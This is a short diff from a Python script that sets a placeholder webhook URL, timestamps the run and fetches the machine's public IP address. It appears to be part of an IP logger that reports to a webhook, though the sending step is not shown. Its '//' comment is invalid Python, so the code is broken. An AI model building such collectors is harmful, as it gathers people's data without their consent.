@@ -5,7 +5,7 @@ from datetime import datetime
 
 //made by fusion reel
 
-hook = Webhook("your-webook- here")
+hook = Webhook("your-webook-here")
 
 time = datetime.now().strftime("%H:%M %p")  
 ip = requests.get('https://api.ipify.org/').text
